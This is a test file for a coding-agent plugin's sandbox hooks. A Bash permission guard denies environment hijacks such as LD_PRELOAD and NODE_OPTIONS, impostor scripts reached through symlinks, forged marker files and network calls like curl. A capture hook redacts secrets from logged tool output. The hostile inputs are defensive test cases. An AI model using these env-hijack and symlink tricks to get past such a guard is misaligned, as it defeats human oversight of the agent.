    test(`guard denies env switch: ${c}`, () => {
      const r = bash(c);
      assert.equal(verdict(r), 'deny');
      assert.match(JSON.parse(r.stdout).hookSpecificOutput.permissionDecisionReason, new RegExp(`setting ${v} is an environment switch`));
    });
  }
}
for (const c of [`HOME=/x`, `ls; TMPDIR=/x`, `sudo HOME=/x ls`, `X=1 NODE_OPTIONS=--require=./x git log`, `env -i LD_PRELOAD=/x git log`, `export A=1 BASH_ENV=/x`,
  `time ZT_RUN_DIR=/x grep a b`, `NODE_OPTIONS+=x git log`]) test(`guard denies env switch: ${c}`, () => assert.equal(verdict(bash(c)), 'deny'));
for (const c of [`FOO=1 node ${SANDBOX} --cwd /r -- ls`, `env FOO=1 git log`, `export FOO=1 && ls`, `echo HOME=1 TMPDIR=2`, `echo $HOME $TMPDIR`, `ls ${'$'}HOME`,
  `grep ZT_RUN_DIR=1 file`, `export -n FOO`]) test(`guard allows plain assignment: ${c}`, () => assert.equal(verdict(bash(c)), 'allow'));

// ---------- guard: which `node <script>` may run (realpath must be the skill's own script: plugin dir, or the dir named by RUN/.skilldir) ----------
const SCRIPT_FIX = /use the absolute path of the skill's sandbox-run\.mjs\/note\.mjs/;
const stage = fx => {
  const own = join(fx.tmp, 'own'), evil = join(fx.tmp, 'evil');
  mkdirSync(own, { recursive: true });
  mkdirSync(evil, { recursive: true });
  for (const f of ['sandbox-run.mjs', 'note.mjs']) writeFileSync(join(own, f), '// the agent\'s own copy\n');
  writeFileSync(join(evil, 'evil.mjs'), '// evil\n');
  symlinkSync(join(evil, 'evil.mjs'), join(evil, 'sandbox-run.mjs'));
  symlinkSync(SANDBOX, join(evil, 'ok-link.mjs'));
  return { own, evil };
};
const { own: OWN, evil: EVIL } = stage(FX);
const nodeDenied = (cmd, fx = FX) => {
  const r = bash(cmd, fx);
  assert.equal(verdict(r), 'deny');
  return JSON.parse(r.stdout).hookSpecificOutput.permissionDecisionReason;
};
for (const cmd of [
  `node ${OWN}/sandbox-run.mjs --cwd /r -- ls`, `node ${OWN}/note.mjs --run ${R} x`, // own copy in the temp dir
  `node ${EVIL}/sandbox-run.mjs --cwd /r -- ls`, // a symlink named sandbox-run.mjs whose target is elsewhere
  `node sandbox-run.mjs --cwd /r -- ls`, `node ./note.mjs`, `node skills/zero-trust-review/sandbox-run.mjs`, `cd ${SKILL_DIR} && node sandbox-run.mjs`, // relative
  `node /nonexistent/sandbox-run.mjs`, `node ${SKILL_DIR}/missing/note.mjs`, // unresolvable
  `node $SK/sandbox-run.mjs --cwd /r -- ls`, `node "$SK"/note.mjs`, `node ~other/sandbox-run.mjs`,
  `node --require ${OWN}/sandbox-run.mjs ${SANDBOX}`, `node -- ${OWN}/note.mjs`,
]) test(`guard denies node script: ${show(cmd)}`, () => assert.match(nodeDenied(cmd), cmd.startsWith('node --') ? /node/ : SCRIPT_FIX));
test('guard allows node script: a symlink to the plugin script resolves to it', () => {
  symlinkSync(SANDBOX, join(FX.tmp, 'own', 'link-to-real'));
  assert.equal(verdict(bash(`node ${OWN}/link-to-real --cwd /r -- ls`)), 'allow');
});
test('guard allows node script: ~/ path to the plugin script', { skip: !ROOT.startsWith(homedir() + '/') }, () => {
  assert.equal(verdict(bash(`node ~${SANDBOX.slice(homedir().length)} --cwd /r -- ls`)), 'allow');
});
test('guard allows node script: the plugin note.mjs', { skip: !existsSync(NOTE) }, () => assert.equal(verdict(bash(`node ${NOTE} begin --unit u --ck p`)), 'allow'));
test('guard allows node script: dir named by RUN/.skilldir (sandbox-run.mjs and note.mjs)', () => {
  assert.equal(verdict(bash(`node ${SK}/sandbox-run.mjs --cwd /r -- ls`)), 'allow');
  assert.equal(verdict(bash(`node ${SK}/note.mjs done --unit u`)), 'allow');
});
const FORGED_SKILLDIR = {
  'no .skilldir at all': () => fixture({ skilldir: false }),
  '.skilldir is a symlink': () => {
    const fx = fixture({ skilldir: false }), real = join(fx.tmp, 'real-skilldir');
    writeFileSync(real, `${fx.sk}\n`, { mode: 0o600 });
    symlinkSync(real, join(fx.run, '.skilldir'));
    return fx;
  },
  '.skilldir is world-writable': () => { const fx = fixture(); chmodSync(join(fx.run, '.skilldir'), 0o666); return fx; },
  '.skilldir is group-writable': () => { const fx = fixture(); chmodSync(join(fx.run, '.skilldir'), 0o664); return fx; },
  '.skilldir holds a relative path': () => { const fx = fixture({ skilldir: false }); writeFileSync(join(fx.run, '.skilldir'), 'sk\n', { mode: 0o600 }); return fx; },
  '.skilldir names a dir without the scripts': () => { const fx = fixture({ skilldir: false }); writeFileSync(join(fx.run, '.skilldir'), `${fx.tmp}/marker\n`, { mode: 0o600 }); return fx; },
  '.skilldir dir holds a symlink to elsewhere': () => {
    const fx = fixture();
    rmSync(join(fx.sk, 'sandbox-run.mjs'));
    symlinkSync(join(EVIL, 'evil.mjs'), join(fx.sk, 'sandbox-run.mjs'));
    return fx;
  },
};
for (const [name, make] of Object.entries(FORGED_SKILLDIR)) {
  test(`guard ignores a forged .skilldir: ${name}`, () => {
    const fx = make();
    assert.match(nodeDenied(`node ${fx.sk}/sandbox-run.mjs --cwd /r -- ls`, fx), SCRIPT_FIX);
  });
}

// the run lifecycle (activate/deactivate) belongs to the lead, and the runner has one normal form
const LIFECYCLE = /run lifecycle belongs to the lead/;
for (const cmd of [
  `node ${SK}/note.mjs activate --name x`, `node ${NOTE} activate`, `node ${NOTE} deactivate`, `node ${NOTE} deactivate --run ${R}`, `node ${NOTE} --run ${R} activate`,
  `node ${NOTE} --run ${R} begin --unit u`, `node ${NOTE} --unit u begin`, `node ${NOTE}`, `node ${NOTE} frobnicate`, `node ${NOTE} -- begin`, `node ${NOTE} Begin --unit u`,
  `node ${NOTE} --run ${R} checkpoint x`, `node ${NOTE} '' begin`, `node ${NOTE} "activate"`, `node ${NOTE} --name x activate`, `node ${SK}/note.mjs --run ${R} activate`,
]) test(`guard denies note.mjs lifecycle: ${show(cmd)}`, () => assert.match(nodeDenied(cmd), LIFECYCLE));
for (const cmd of [
  `node ${SANDBOX} --help`, `node ${SANDBOX} --plan x -- ls`, `node ${SANDBOX} ls`, `node ${SANDBOX}`, `node ${SANDBOX} --cwd /r ls`, `node ${SANDBOX} --force -- ls`,
  `node ${SANDBOX} --cwd`, `node ${SANDBOX} --cwd -- ls`, `node ${SANDBOX} --check-all -- ls`, `node ${SANDBOX} --unknown=1 -- ls`, `node ${SK}/sandbox-run.mjs --help`,
]) test(`guard denies sandbox-run.mjs odd form: ${show(cmd)}`, () => assert.match(nodeDenied(cmd), /sandbox-run\.mjs/));

// the marker dir under $HOME (the default location): `~` must resolve
test('guard resolves ~ for the marker dir under $HOME', () => {
  const fx = fixture({ home: true });
  for (const c of ['echo x > ~/.cache/zt-review/.active', 'tee ~/.cache/zt-review/.active', 'cp a ~/.cache/zt-review/x', 'echo x >> ~/.cache/zt-review/../zt-review/.active']) {
    assert.equal(verdict(bash(c, fx)), 'deny', c);
  }
  for (const c of ['cat ~/.cache/zt-review/.active', 'echo x > ~/other', 'ls ~/.cache/zt-review']) assert.equal(verdict(bash(c, fx)), 'allow', c);
});

test('guard deny output: JSON shape, reason names the program and the fix, exit 0', () => {
  const r = bash(`ls && python3 -c 'import pytest'`);
  assert.equal(r.status, 0);
  const o = JSON.parse(r.stdout).hookSpecificOutput;
  assert.equal(o.hookEventName, 'PreToolUse');
  assert.equal(o.permissionDecision, 'deny');
  assert.match(o.permissionDecisionReason, /^zero-trust-review: python3 would execute repo code or reach the network outside the sandbox\./);
  for (const s of ['sandbox-run.mjs', '--cwd DIR --rw DIR', '--ro VENV', 'exit 86', 'UNVERIFIABLE', 'note.mjs']) assert.ok(o.permissionDecisionReason.includes(s), s);
});

test('guard hint for programs off the read-only allow-list: names the allowed tools, and says sort -u replaces uniq', () => {
  const reason = JSON.parse(bash('sort a | uniq').stdout).hookSpecificOutput.permissionDecisionReason;
  assert.match(reason, /^zero-trust-review: uniq is not on the review allow-list\. Use grep\/sort\/awk \(sort -u instead of uniq\) or the Read tool\./);
});

test('guard xargs denial says why: arguments supplied on stdin cannot be checked', () => {
  const reason = JSON.parse(bash('echo a | xargs echo').stdout).hookSpecificOutput.permissionDecisionReason;
  assert.match(reason, /^zero-trust-review: xargs is not allowed\. Reason: arguments supplied on stdin cannot be checked: pass the files explicitly\./);
});

test('guard reports the first bad segment when the first is fine and the second is not', () => {
  const o = JSON.parse(bash('git log && curl http://x').stdout).hookSpecificOutput;
  assert.match(o.permissionDecisionReason, /curl/);
});

// ---------- guard: inactive and error paths (exit 0, no output) ----------
const silent = r => { assert.equal(r.status, 0, r.stderr); assert.equal(r.stdout, ''); };
test('guard inactive: no marker', () => silent(bash('python3 x', fixture({ marker: false }))));
test('guard active: marker 11 h old still counts', () => assert.equal(verdict(bash('python3 x', fixture({ ageH: 11 }))), 'deny'));
test('guard inactive: no agent_id (main thread)', () => silent(bash('python3 x', FX, { agent_id: undefined })));
test('guard inactive: marker first line not absolute', () => silent(bash('python3 x', fixture({ markerText: 'relative/run\n' }))));
test('guard inactive: empty marker', () => silent(bash('python3 x', fixture({ markerText: '' }))));
test('guard error input: garbage JSON', () => silent(drive(GUARD, FX, null, '{not json')));
test('guard error input: empty stdin', () => silent(drive(GUARD, FX, null, '')));
test('guard error input: command is not a string', () => silent(bash(42)));
test('guard error input: no tool_input', () => silent(drive(GUARD, FX, { agent_id: 'a' })));
test('guard internal error: exit 0 silent, one line in RUN/hook-errors.log', () => {
  const fx = fixture();
  silent(bash('cd x', fx, { cwd: 123 })); // path.resolve(123, ...) throws inside the decision (the cd is followed)
  const log = readFileSync(join(fx.run, 'hook-errors.log'), 'utf8');
  assert.equal(log.trim().split('\n').length, 1);
  assert.match(log, /zt-guard/);
});
test('guard writes no error log on a normal run', () => {
  const fx = fixture();
  bash('python3 x', fx);
  assert.equal(existsSync(join(fx.run, 'hook-errors.log')), false);
});

// ---------- capture ----------
const postIn = (over = {}) => ({
  hook_event_name: 'PostToolUse', tool_name: 'mcp__grafana__query_loki_logs', tool_use_id: 'toolu_1', agent_id: 'agent-1',
  tool_input: { expr: '{app="x"}' }, tool_response: 'line one', ...over,
});
const post = (fx, over) => drive(CAPTURE, fx, postIn(over));
const obs = fx => {
  const f = join(fx.run, 'obs.jsonl');
  return existsSync(f) ? readFileSync(f, 'utf8').split('\n').filter(Boolean).map(l => JSON.parse(l)) : [];
};

// marker trust is decided by skills/zero-trust-review/runctx.mjs (owner, symlinks, group/world-writable, age): every one of these leaves BOTH hooks inactive
const UNTRUSTED = {
  'world-writable marker file': () => fixture({ markerMode: 0o666 }),
  'group-writable marker file': () => fixture({ markerMode: 0o620 }),
  'world-writable marker dir (a planted marker in a shared dir)': () => fixture({ dirMode: 0o777 }),
  'marker file is a symlink': () => {
    const fx = fixture(), real = join(fx.tmp, 'real-active'), m = join(fx.md, '.active');
    writeFileSync(real, `${fx.run}\n`, { mode: 0o600 });
    rmSync(m);
    symlinkSync(real, m);
    return fx;
  },
  'marker dir is a symlink': () => {
    const fx = fixture(), link = join(fx.tmp, 'marker-link');
    symlinkSync(fx.md, link);
    return { ...fx, md: link };
  },
  'run dir is world-writable': () => { const fx = fixture(); chmodSync(fx.run, 0o777); return fx; },
  'run dir is a symlink': () => {
    const real = fixture(), fx = fixture({ marker: false }), link = join(fx.tmp, 'run-link');
    symlinkSync(real.run, link);
    writeFileSync(join(fx.md, '.active'), `${link}\n`, { mode: 0o600 });
    return { ...fx, run: link };
  },
  'stale marker (13 h)': () => fixture({ ageH: 13 }),
};
for (const [name, make] of Object.entries(UNTRUSTED)) {
  test(`guard inactive: ${name}`, () => silent(bash('python3 x', make())));
  test(`capture inactive: ${name}`, () => {
    const fx = make();
    silent(post(fx));
    assert.equal(existsSync(join(fx.run, 'obs.jsonl')), false);
  });
}
test('capture does not write through a symlinked obs.jsonl, and says so in hook-errors.log', () => {
  const fx = fixture(), victim = join(fx.tmp, 'victim.txt');
  writeFileSync(victim, 'keep\n');
  symlinkSync(victim, join(fx.run, 'obs.jsonl'));
  silent(post(fx));
  assert.equal(readFileSync(victim, 'utf8'), 'keep\n');
  assert.match(readFileSync(join(fx.run, 'hook-errors.log'), 'utf8'), /zt-capture/);
});
test('capture does not write through a symlinked hook-errors.log either', () => {
  const fx = fixture(), victim = join(fx.tmp, 'victim.txt');
  writeFileSync(victim, 'keep\n');
  symlinkSync(victim, join(fx.run, 'obs.jsonl'));
  symlinkSync(victim, join(fx.run, 'hook-errors.log'));
  silent(post(fx));
  assert.equal(readFileSync(victim, 'utf8'), 'keep\n');
});
test('capture writes obs.jsonl with mode 0600', () => {
  const fx = fixture();
  post(fx);
  assert.equal(statSync(join(fx.run, 'obs.jsonl')).mode & 0o777, 0o600);
});

test('capture writes one line with the documented fields', () => {
  const fx = fixture();
  const r = post(fx);
  silent(r);
  const [row, ...rest] = obs(fx);
  assert.equal(rest.length, 0);
  assert.deepEqual(Object.keys(row).sort(), ['agent', 'id', 'input', 'out', 'tool', 'ts']);
  assert.equal(row.id, 'toolu_1');
  assert.equal(new Date(row.ts).toISOString(), row.ts);
  assert.equal(row.tool, 'mcp__grafana__query_loki_logs');
  assert.equal(row.input, '{"expr":"{app=\\"x\\"}"}');
  assert.equal(row.out, 'line one');
  assert.equal(row.agent, 'agent-1');
});
test('capture appends, one line per call', () => {
  const fx = fixture();
  post(fx, { tool_use_id: 'a' });
  post(fx, { tool_use_id: 'b' });
  assert.deepEqual(obs(fx).map(r => r.id), ['a', 'b']);
});
test('capture generates an id when tool_use_id is absent', () => {
  const fx = fixture();
  post(fx, { tool_use_id: undefined });
  assert.match(obs(fx)[0].id, /^o[0-9a-z]{6,}$/);
});
test('capture cuts input to 1000 chars and out to 8000', () => {
  const fx = fixture();
  post(fx, { tool_input: { q: 'x'.repeat(5000) }, tool_response: 'y'.repeat(20000) });
  const [row] = obs(fx);
  assert.equal(row.input.length, 1000);
  assert.equal(row.out.length, 8000);
});
test('capture response shape: plain string', () => {
  const fx = fixture();
  post(fx, { tool_response: 'plain text' });
  assert.equal(obs(fx)[0].out, 'plain text');
});
test('capture response shape: {content:[{type:text,text}]} concatenates every text part and skips non-text', () => {
  const fx = fixture();
  post(fx, { tool_response: { content: [{ type: 'text', text: 'alpha' }, { type: 'image', data: 'AAAA' }, { type: 'text', text: 'beta' }] } });
  const out = obs(fx)[0].out;
  assert.ok(out.includes('alpha') && out.includes('beta'));
  assert.ok(!out.includes('AAAA'));
});
test('capture response shape: bare array of content blocks', () => {
  const fx = fixture();
  post(fx, { tool_response: [{ type: 'text', text: 'one' }, { type: 'text', text: 'two' }] });
  const out = obs(fx)[0].out;
  assert.ok(out.includes('one') && out.includes('two'));
});
test('capture response shape: other object is JSON.stringify', () => {
  const fx = fixture();
  post(fx, { tool_response: { result: { rows: [1, 2] } } });
  assert.equal(obs(fx)[0].out, '{"result":{"rows":[1,2]}}');
});
test('capture response shape: null/absent response does not crash', () => {
  const fx = fixture();
  silent(post(fx, { tool_response: undefined }));
  assert.equal(obs(fx).length, 1);
});
test('capture redacts secrets in the output', () => {
  const fx = fixture();
  const secrets = ['abc.def-123', 'hunter2', 'sk-XYZ789', 'tkn123', 'zzTopSecret', 'bearerTok-9'];
  post(fx, {
    tool_response: `Authorization: Bearer ${secrets[0]}\npassword=${secrets[1]} api_key: ${secrets[2]} {"token":"${secrets[3]}"} secret = ${secrets[4]} got Bearer ${secrets[5]} ok`,
  });
  const out = obs(fx)[0].out;
  for (const s of secrets) assert.ok(!out.includes(s), `${s} leaked: ${out}`);
  assert.ok(out.includes('[redacted]'));
  assert.ok(out.includes('password'), 'key names stay readable');
});
test('capture keeps ordinary output untouched', () => {
  const fx = fixture();
  post(fx, { tool_response: 'tokens used: n/a, 12 rows, level=error' });
  assert.equal(obs(fx)[0].out, 'tokens used: n/a, 12 rows, level=error');
});
test('capture inactive: no marker / stale marker / no agent_id never write', () => {
  const none = fixture({ marker: false }), stale = fixture({ ageH: 13 }), main = fixture();
  silent(post(none)); silent(post(stale)); silent(post(main, { agent_id: undefined }));
  for (const fx of [none, stale, main]) assert.equal(existsSync(join(fx.run, 'obs.jsonl')), false);
});
test('capture error input: garbage JSON and empty stdin exit 0 silently', () => {
  silent(drive(CAPTURE, FX, null, '{nope'));
  silent(drive(CAPTURE, FX, null, ''));
});
test('capture error: RUN folder missing exits 0 silently and does not recreate it', () => {
  const fx = fixture();
  rmSync(fx.run, { recursive: true });
  silent(post(fx));
  assert.equal(existsSync(fx.run), false);
});

// ---------- manifests ----------
const json = p => JSON.parse(readFileSync(join(ROOT, p), 'utf8'));

test('plugin.json: name, version, author, hooks path exists, skills/ present without a manifest key', () => {
  const m = json('.claude-plugin/plugin.json');
  assert.equal(m.name, 'pnnutkung-skills');
  assert.equal(m.version, '0.1.0');
  assert.ok(m.description);
  assert.equal(m.author.name, 'PNNutkung');
  assert.ok(existsSync(join(ROOT, m.hooks)), m.hooks);
  assert.ok(existsSync(join(ROOT, 'skills')));
  assert.equal('skills' in m, false);
});
test('marketplace.json: one entry for this plugin with source ./', () => {
  const m = json('.claude-plugin/marketplace.json');
  assert.equal(m.name, 'pnnutkung-skills');
  assert.ok(m.owner.name);
  assert.equal(m.plugins.length, 1);
  assert.equal(m.plugins[0].name, json('.claude-plugin/plugin.json').name);
  assert.equal(m.plugins[0].source, './');
});
test('hooks.json: wrapped in "hooks", every referenced script exists, timeouts 5', () => {
  const { hooks } = json('hooks/hooks.json');
  assert.deepEqual(Object.keys(hooks).sort(), ['PostToolUse', 'PreToolUse']);
  for (const group of Object.values(hooks).flat()) for (const h of group.hooks) {
    assert.equal(h.type, 'command');
    assert.equal(h.timeout, 5);
    const [, rel] = h.command.match(/\$\{CLAUDE_PLUGIN_ROOT\}\/(hooks\/[\w.-]+\.mjs)/) ?? [];
    assert.ok(rel && existsSync(join(ROOT, rel)), h.command);
  }
});
test('hooks.json: PreToolUse guards Bash, PostToolUse captures observability MCP tools', () => {
  const { hooks } = json('hooks/hooks.json');
  const [pre] = hooks.PreToolUse, [obsHook] = hooks.PostToolUse;
  assert.equal(pre.matcher, 'Bash');
  assert.match(pre.hooks[0].command, /zt-guard\.mjs/);
  assert.match(obsHook.hooks[0].command, /zt-capture\.mjs/);
  // a matcher with characters beyond letters/digits/_/-/|/, is a JS RegExp, unanchored, case-sensitive
  const re = new RegExp(obsHook.matcher);
  for (const n of ['mcp__grafana__query_loki_logs', 'mcp__grafana__query_prometheus', 'mcp__plugin_agoda-skills_tempo__search', 'mcp__datadog__logs',
    'mcp__plugin_x_Sentry__issues', 'mcp__opensearch__q', 'mcp__Grafana__x', 'mcp__grafana__query_pyroscope', 'mcp__grafana__query_elasticsearch']) assert.ok(re.test(n), n);
  for (const n of ['Bash', 'Read', 'mcp__slack__send', 'mcp__plugin_agoda-skills_glean__search', 'grafana']) assert.equal(re.test(n), false, n);
});
